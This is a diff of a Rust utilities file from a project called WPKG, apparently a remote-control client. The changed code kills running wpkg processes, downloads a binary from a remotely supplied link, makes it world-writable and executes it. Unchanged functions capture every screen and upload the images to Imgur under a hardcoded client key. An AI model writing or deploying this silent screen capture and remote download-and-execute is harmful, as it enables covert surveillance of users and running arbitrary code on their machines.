@@ -6,14 +6,18 @@ use std::fs;
 use std::fs::File;
 use std::io;
 use std::io::Cursor;
+use std::os::unix::prelude::PermissionsExt;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
+use std::vec;
 
 use imgurs::ImgurClient;
 use msgbox::*;
 use rand::prelude::*;
 use screenshots::Screen;
+use sysinfo::ProcessExt;
+use sysinfo::SystemExt;
 use systemstat::{saturating_sub_bytes, Platform, System};
 use tracing::*;
 
@@ -24,16 +28,28 @@ pub struct Utils;
 
 impl Utils {
     pub async fn update(link: &str) -> anyhow::Result<()>{
-        let location = Self::get_working_dir()+r#"/wpkg"#;
+        
+        
+        // Kill old wpkg
+        #[cfg(not(target_os="windows"))]
+        {
+            let mut system = sysinfo::System::new();
+            system.refresh_all();
+            for p in system.processes_by_name("wpkg") {
+                nix::sys::signal::kill(nix::unistd::Pid::from_raw(p.pid().to_string().parse()?), nix::sys::signal::SIGKILL).expect("s");
+            }
+        }
+
+        let location = Self::get_working_dir()?+r#"/wpkg"#;
         info!("Updating");
         #[cfg(target_os="windows")]
         let suffix = ".exe";
 
         #[cfg(not(target_os="windows"))]
         let suffix = "";
-
+        
         Self::download_from_url(link, &(location.clone()+suffix)).await?;
-        Self::run_process(&(location+suffix), "", false);
+        Self::run_process(&(location+suffix), vec![""], false)?;
         panic!("Kurwa zjebało się");
     }
     pub async fn check_updates() -> anyhow::Result<()>{
@@ -43,16 +59,15 @@ impl Utils {
                 "https://raw.githubusercontent.com/W-P-K-G/JSONFiles/master/Versions.json").await?)?;
         let nevest_ver = ver[ver.len()-1].clone();
         if globals::CURRENT_VERSION != nevest_ver.version{
-            let location = Self::get_working_dir()+r#"/wpkg"#;
-            let target = Self::get_working_dir()+r#"/update"#;
+            let target = Self::get_working_dir()?+r#"/update"#;
             #[cfg(target_os="windows")]
             let suffix = ".exe";
     
             #[cfg(not(target_os="windows"))]
             let suffix = "";
-            println!("{}",location.clone()+suffix);
-            fs::copy(location.clone()+suffix, target+suffix)?;
-            Self::run_process(&(location+suffix), &format!("--update {}", nevest_ver.link), false);
+            Self::download_from_url(&nevest_ver.link, &(target.clone()+suffix)).await?;
+            Self::run_process(&(target+suffix), vec!["--update", &nevest_ver.link], false)?;
+            panic!();
         } else {
             info!("WPKG Up to date!");
         }
@@ -64,6 +79,13 @@ impl Utils {
     pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()>{
         let resp = reqwest::get(url).await?;
         let mut out = File::create(path)?;
+        
+        #[cfg(not(target="windows"))]{
+            let mut permissions = out.metadata()?.permissions();
+            permissions.set_mode(0o777);
+            out.set_permissions(permissions)?;
+        }
+
         let mut content =  Cursor::new(resp.bytes().await?);
         io::copy(&mut content, &mut out)?;
         Ok(())
@@ -73,39 +95,41 @@ impl Utils {
         tokio::spawn(async move { msgbox::create("", &message, IconType::Info) });
     }
 
-    pub fn run_process(exe: &str, args: &str, wait: bool) {
+    pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
         if wait {
-            Command::new(exe).args(&[args]).output().unwrap();
+            Command::new(exe).args(args).output()?;
         } else {
-            Command::new(exe).args(&[args]).spawn().unwrap();
+            Command::new(exe).args(args).spawn()?;
         }
+        Ok(())
     }
 
-    pub fn run_process_with_work_dir(exe: &str, args: &str, wait: bool, currentdir: &str) {
+    pub fn run_process_with_work_dir(exe: &str, args: &str, wait: bool, currentdir: &str) -> anyhow::Result<()> {
         if wait {
             Command::new(exe)
                 .args(&[args])
                 .current_dir(currentdir)
                 .output()
-                .unwrap();
+                ?;
         } else {
             Command::new(exe)
                 .args(&[args])
                 .current_dir(currentdir)
                 .spawn()
-                .unwrap();
+                ?;
         }
+        Ok(())
     }
 
-    pub fn get_working_dir() -> String {
+    pub fn get_working_dir() -> anyhow::Result<String> {
         #[cfg(not(target_os = "windows"))]
-        return env::current_dir().unwrap().display().to_string();
+        return Ok(env::current_dir()?.display().to_string());
 
         #[cfg(target_os = "windows")]
         {
             use platform_dirs::AppDirs;
 
-            let app_dirs = AppDirs::new(Some("WPKG"), true).unwrap();
+            let app_dirs = AppDirs::new(Some("WPKG"), true)?;
             let config_dir = app_dirs.config_dir.display().to_string();
 
             if !Path::new(&config_dir).exists() {
@@ -113,11 +137,11 @@ impl Utils {
                 fs::create_dir(&config_dir)?;
             }
 
-            return config_dir;
+            return Ok(config_dir);
         }
     }
 
-    pub fn screenshot() -> String {
+    pub fn screenshot() -> anyhow::Result<String> {
         info!("Taking screenshot...");
         let screens = Screen::all();
 
@@ -126,20 +150,20 @@ impl Utils {
 
         // Save the image.
         let mut rng = rand::thread_rng();
-        let savepath = format!("{}/image{}.png", Utils::get_working_dir(), rng.gen::<i32>());
-        fs::write(&savepath, &buffer).unwrap();
+        let savepath = format!("{}/image{}.png", Utils::get_working_dir()?, rng.gen::<i32>());
+        fs::write(&savepath, &buffer)?;
 
-        savepath
+        Ok(savepath)
     }
 
-    pub async fn screenshot_url() -> String {
-        let path = Utils::screenshot();
+    pub async fn screenshot_url() -> anyhow::Result<String> {
+        let path = Utils::screenshot()?;
         let info = ImgurClient::new("3e3ce0d7ac14d56")
             .upload_image(&path)
             .await
-            .unwrap();
+            ?;
 
-        info.data.link
+        Ok(info.data.link)
     }
 
     pub fn stat() -> String {
